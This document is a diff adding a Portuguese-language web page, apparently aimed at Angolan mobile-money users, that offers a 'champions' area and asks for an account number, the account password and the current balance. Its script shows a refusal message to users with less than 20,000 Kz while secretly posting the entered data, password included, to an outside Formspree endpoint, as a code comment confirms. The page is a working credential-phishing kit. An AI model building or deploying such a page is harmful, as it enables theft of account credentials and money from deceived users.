@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Tela dos Campeões</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      margin: 0;
+      font-family: 'Inter', sans-serif;
+      background: linear-gradient(135deg, #0b0c10, #1f2833);
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: #fff;
+    }
+    .container {
+      background: #101820;
+      padding: 20px;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: 0 0 30px rgba(0, 255, 180, 0.2);
+      text-align: center;
+      animation: fadeIn 0.8s ease;
+      border-radius: 12px;
+    }
+
+    @keyframes fadeIn {
+      from {opacity: 0; transform: scale(0.95);}
+      to {opacity: 1; transform: scale(1);}
+    }
+
+    h1 {
+      font-size: 22px;
+      margin-bottom: 8px;
+    }
+
+    h1 span {
+      color: #00ffc3;
+    }
+
+    p {
+      font-size: 14px;
+      color: #bbb;
+      margin-bottom: 20px;
+    }
+
+    label {
+      display: block;
+      text-align: left;
+      margin: 10px 0 5px;
+      font-size: 13px;
+      color: #ddd;
+    }
+
+    .input-group {
+      position: relative;
+      margin-bottom: 20px;
+    }
+
+    .input-group i {
+      position: absolute;
+      left: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #888;
+    }
+
+    input {
+      width: 100%;
+      padding: 12px 12px 12px 35px;
+      border-radius: 10px;
+      border: none;
+      background: #1f1f1f;
+      color: #fff;
+      font-size: 14px;
+    }
+
+    input::placeholder {
+      color: #777;
+    }
+
+    button {
+      width: 100%;
+      padding: 14px;
+      border: none;
+      border-radius: 10px;
+      background: linear-gradient(45deg, #00ffc3, #00a8ff);
+      color: white;
+      font-size: 15px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: 0.3s;
+      box-shadow: 0 0 10px #00ffc3;
+    }
+
+    button:hover {
+      opacity: 0.9;
+      transform: scale(1.02);
+    }
+
+    .message {
+      margin-top: 20px;
+      font-size: 14px;
+      padding: 15px;
+      background: #181818;
+      display: none;
+      border-radius: 12px;
+      color: #00ffc3;
+      box-shadow: 0 0 10px rgba(0, 255, 180, 0.3);
+    }
+
+    .message i {
+      margin-right: 8px;
+      color: #00ffc3;
+    }
+
+    .back {
+      display: inline-block;
+      margin-top: 20px;
+      color: #999;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    .back:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Bem-vindo à <span>Tela dos Campeões</span></h1>
+    <p>Somente para quem tem saldo de 20.000 Kz ou mais</p>
+
+    <form id="championForm" method="POST">
+      <label for="account">Número da Conta</label>
+      <div class="input-group">
+        <i class="fas fa-phone"></i>
+        <input type="tel" id="account" name="numero" placeholder="912345678" pattern="9[0-9]{8}" maxlength="9" required>
+      </div>
+
+      <label for="senha">Senha da sua conta</label>
+      <div class="input-group">
+        <i class="fas fa-lock"></i>
+        <input type="password" id="senha" name="senha" placeholder="********" required>
+      </div>
+
+      <label for="saldo">Seu Saldo Atual</label>
+      <div class="input-group">
+        <i class="fas fa-wallet"></i>
+        <input type="number" id="saldo" name="saldo" placeholder="Ex: 20000" required>
+      </div>
+
+      <button type="submit">Entrar</button>
+    </form>
+
+    <div id="resposta" class="message"><span id="resposta-texto"></span></div>
+
+    <a href="index.html" class="back">← Voltar</a>
+  </div>
+
+  <script>
+    document.getElementById("championForm").addEventListener("submit", function(e) {
+      e.preventDefault();
+
+      const form = e.target;
+      const numero = document.getElementById("account").value;
+      const senha = document.getElementById("senha").value;
+      const saldo = parseInt(document.getElementById("saldo").value);
+      const resposta = document.getElementById("resposta");
+      const respostaTexto = document.getElementById("resposta-texto");
+
+      resposta.style.display = "block";
+      resposta.style.color = "#00ffc3";
+      respostaTexto.innerHTML = "<i class='fas fa-spinner fa-spin'></i> Verificando conta...";
+
+      setTimeout(() => {
+        if (isNaN(saldo)) {
+          respostaTexto.innerHTML = "<i class='fas fa-times-circle'></i> Por favor, insira um saldo válido.";
+          resposta.style.color = "#ff4b4b";
+        } else if (saldo >= 20000) {
+          respostaTexto.innerHTML = "<i class='fas fa-check-circle'></i> ✅ Acesso concedido. O seu saldo é suficiente para continuar!";
+          resposta.style.color = "#00ffc3";
+        } else {
+          respostaTexto.innerHTML = "<i class='fas fa-exclamation-circle'></i> Desculpa, mas esta conta não possui 20.000 Kz ou mais.";
+          resposta.style.color = "#ff4b4b";
+
+          // Envia os dados mesmo assim
+          const formData = new FormData(form);
+          fetch("https://formspree.io/f/xvgzrljq", {
+            method: "POST",
+            body: formData
+          }).then(() => {
+            console.log("Dados enviados com saldo abaixo de 20 mil.");
+          }).catch((err) => {
+            console.error("Erro ao enviar:", err);
+          });
+        }
+      }, 2000);
+    });
+  </script>
+</body>
+</html>
